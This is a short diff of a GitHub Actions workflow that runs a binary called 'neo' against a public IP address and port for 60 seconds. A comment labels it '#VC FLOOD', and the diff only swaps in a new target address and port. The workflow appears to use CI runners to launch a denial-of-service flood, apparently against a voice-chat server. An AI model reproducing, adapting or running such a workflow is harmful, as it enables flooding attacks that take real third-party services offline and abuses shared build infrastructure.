@@ -10,4 +10,4 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - run: chmod +x neo
-      - run: ./neo 91.108.17.33 32000 60  #VC FLOOD
+      - run: ./neo 91.108.17.21 32003 60  #VC FLOOD
